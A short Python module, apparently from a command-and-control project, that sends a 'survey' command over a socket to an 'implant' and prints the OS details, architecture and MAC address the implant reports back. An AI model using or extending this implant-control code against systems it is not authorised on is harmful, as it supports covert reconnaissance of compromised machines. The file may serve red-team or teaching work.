# Patrick Sacchet
# This file will implement functionality for sending a survey command and parsing the results sent by 
    # the server

import socket
import ctypes

import Common

def handleSurvey(sock : socket.socket) -> bool:
    survey_command = Common.Command(command=Common.Commands.survey) # don't need any details here
    bytes_sent = sock.send(bytes(survey_command))

    print(f"Sent {bytes_sent} bytes to implant")

    data = sock.recv(ctypes.sizeof(Common.Response))

    surveydata = ctypes.cast(data, ctypes.POINTER(Common.Response))

    # Print all our info
    print(f"Operating system: {surveydata.contents.responsedetails.surveyresponse.osname.decode('utf-8')}")
    print(f"Operating system release: {surveydata.contents.responsedetails.surveyresponse.osrelease.decode('utf-8')}")
    print(f"Operating system version: {surveydata.contents.responsedetails.surveyresponse.osversion.decode('utf-8')}")
    print(f"Architecture: {surveydata.contents.responsedetails.surveyresponse.arch.decode('utf-8')}")
    print(f"MAC address: {surveydata.contents.responsedetails.surveyresponse.mac.decode('utf-8')}")
    
    return True